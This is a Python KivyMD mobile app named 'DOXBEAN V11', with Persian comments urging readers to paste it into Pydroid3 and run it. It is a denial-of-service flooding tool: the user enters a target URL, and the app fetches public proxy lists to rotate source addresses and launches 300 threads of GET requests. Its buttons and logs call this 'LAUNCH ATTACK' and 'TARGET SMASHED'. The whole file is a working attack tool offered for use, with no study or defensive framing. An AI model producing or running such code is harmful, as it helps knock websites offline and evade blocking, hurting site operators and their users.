# DOXBEAN V11 - فیلد پاک می‌شه + REAL ATTACK
# کپی کن → Pydroid3 → Run

from kivy.lang import Builder
from kivymd.app import MDApp
from kivymd.uix.button import MDRectangleFlatButton
from kivymd.uix.textfield import MDTextField
from kivymd.uix.label import MDLabel
from kivymd.uix.progressbar import MDProgressBar
from kivymd.uix.list import OneLineListItem
from kivy.core.window import Window
from kivy.clock import Clock, mainthread
from kivy.metrics import dp, sp
import urllib3
import threading
import time
import random

Window.clearcolor = (0.05, 0.05, 0.05, 1)

PROXY_APIS = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=1000&country=all",
    "https://www.proxy-list.download/api/v1/get?type=http"
]

KV = '''
MDBoxLayout:
    orientation: "vertical"
    padding: dp(20)
    spacing: dp(15)
    md_bg_color: 0.05, 0.05, 0.05, 1

    MDLabel:
        text: "DOXBEAN V11"
        font_size: sp(34)
        halign: "center"
        text_color: 1, 1, 1, 1
        bold: True

    MDLabel:
        text: "REAL ATTACK + 300 THREADS"
        font_size: sp(16)
        halign: "center"
        text_color: 0, 1, 0, 1
        italic: True

    MDLabel:
        text: "Target"
        text_color: 1, 0, 0, 1
        font_size: sp(19)
        bold: True

    MDTextField:
        id: target
        hint_text: "https://example.com"
        text: "https://httpbin.org/get"
        font_size: sp(17)
        on_focus: if self.focus: self.text = "" if self.text == "https://httpbin.org/get" else self.text

    MDLabel:
        text: "Requests"
        text_color: 1, 0, 0, 1
        font_size: sp(19)
        bold: True

    MDTextField:
        id: requests
        hint_text: "100"
        text: "100"
        input_filter: "int"
        font_size: sp(17)
        on_focus: if self.focus: self.text = "" if self.text == "100" else self.text

    MDLabel:
        text: "Time (sec)"
        text_color: 1, 0, 0, 1
        font_size: sp(19)
        bold: True

    MDTextField:
        id: time
        hint_text: "10"
        text: "10"
        input_filter: "int"
        font_size: sp(17)
        on_focus: if self.focus: self.text = "" if self.text == "10" else self.text

    MDProgressBar:
        id: bar
        value: 0
        color: 1, 0, 0, 1

    MDRectangleFlatButton:
        id: launch_btn
        text: "LAUNCH ATTACK"
        md_bg_color: 0.6, 0, 0, 1
        text_color: 1, 1, 1, 1
        font_size: sp(26)
        size_hint_y: None
        height: dp(70)
        on_release: app.toggle_attack()

    MDLabel:
        id: status
        text: "Ready..."
        halign: "center"
        text_color: 1, 0.3, 0.3, 1
        font_size: sp(19)

    ScrollView:
        size_hint_y: None
        height: dp(160)
        MDList:
            id: log
'''

class AttackEngine:
    def __init__(self, app):
        self.app = app
        self.running = False
        self.sent = 0
        self.total = 0
        self.proxies = []
        self.last_proxy_update = 0
        self.http = urllib3.PoolManager(timeout=urllib3.Timeout(connect=1.0, read=2.0))

    @mainthread
    def log(self, msg):
        try:
            self.app.root.ids.log.add_widget(OneLineListItem(text=msg, text_color=[1,0.4,0.4,1]))
        except: pass

    @mainthread
    def update_progress(self, percent):
        try:
            self.app.root.ids.bar.value = percent
        except: pass

    @mainthread
    def set_status(self, txt):
        try:
            self.app.root.ids.status.text = txt
        except: pass

    @mainthread
    def set_button(self, text, color):
        try:
            btn = self.app.root.ids.launch_btn
            btn.text = text
            btn.md_bg_color = color
        except: pass

    def fetch_proxies(self):
        proxies = set()
        for api in PROXY_APIS:
            try:
                r = self.http.request('GET', api, timeout=3)
                if r.status == 200:
                    for line in r.data.decode('utf-8', errors='ignore').splitlines():
                        line = line.strip()
                        if ':' in line and '.' in line:
                            proxies.add(line)
            except: pass
        return list(proxies)[:80]

    def get_proxy(self):
        now = time.time()
        if now - self.last_proxy_update >= 0.5 or not self.proxies:
            self.proxies = self.fetch_proxies()
            self.last_proxy_update = now
            if self.proxies:
                self.log(f"[PROXY] {len(self.proxies)} loaded")
        return random.choice(self.proxies) if self.proxies else None

    def send_single_request(self, url):
        proxy = self.get_proxy()
        try:
            if proxy:
                proxy_url = f"http://{proxy}"
                proxy_http = urllib3.ProxyManager(proxy_url, timeout=urllib3.Timeout(2.0))
                proxy_http.request('GET', url, headers={'User-Agent': 'DOXBEAN V11'})
            else:
                self.http.request('GET', url, headers={'User-Agent': 'DOXBEAN V11'})
            return True
        except:
            return False

    def attack(self):
        url = self.app.root.ids.target.text.strip()
        if not url.startswith("http"):
            self.set_status("Invalid URL!")
            self.app.finish_attack()
            return

        try: self.total = int(self.app.root.ids.requests.text or 100)
        except: self.total = 100
        try: duration = int(self.app.root.ids.time.text or 10)
        except: duration = 10

        self.log(f"[FIRE] {self.total} REQ | {duration}s")
        self.set_status("ATTACKING...")
        self.sent = 0
        start = time.time()

        def worker():
            while self.running and time.time() - start < duration and self.sent < self.total:
                if self.send_single_request(url):
                    self.sent += 1
                    if self.sent % 10 == 0 or self.sent == self.total:
                        self.log(f"Sent: {self.sent}/{self.total}")
                        self.update_progress(self.sent / self.total * 100)

        threads = []
        for _ in range(300):
            if not self.running: break
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)

        end_time = time.time() + duration
        while self.running and time.time() < end_time and self.sent < self.total:
            time.sleep(0.1)

        self.log("[DONE] TARGET SMASHED!")
        self.set_status("ATTACK FINISHED")
        self.update_progress(100)
        self.app.finish_attack()

class DoxApp(MDApp):
    def build(self):
        self.theme_cls.theme_style = "Dark"
        self.theme_cls.primary_palette = "Red"
        return Builder.load_string(KV)

    def on_start(self):
        self.engine = AttackEngine(self)
        self.log("DOXBEAN V11 – فیلد پاک می‌شه!")

    def toggle_attack(self):
        if self.engine.running:
            self.stop_attack()
        else:
            self.launch_attack()

    def launch_attack(self):
        if self.engine.running: return
        self.root.ids.log.clear_widgets()
        self.engine.running = True
        self.engine.sent = 0
        self.engine.set_button("STOP ATTACK", [1, 0, 0, 1])
        threading.Thread(target=self.engine.attack, daemon=True).start()
        duration = int(self.root.ids.time.text or 10)
        Clock.schedule_once(lambda dt: self.finish_attack(), duration)

    def stop_attack(self):
        self.engine.running = False
        self.log("STOPPED BY USER")
        self.finish_attack()

    def finish_attack(self):
        if not self.engine.running: return
        self.engine.running = False
        self.engine.set_button("LAUNCH ATTACK", [0.6, 0, 0, 1])
        self.set_status("STOPPED")

    @mainthread
    def log(self, msg):
        try:
            self.root.ids.log.add_widget(OneLineListItem(text=msg, text_color=[1,0.4,0.4,1]))
        except: pass

    @mainthread
    def set_status(self, txt):
        try:
            self.root.ids.status.text = txt
        except: pass

DoxApp().run()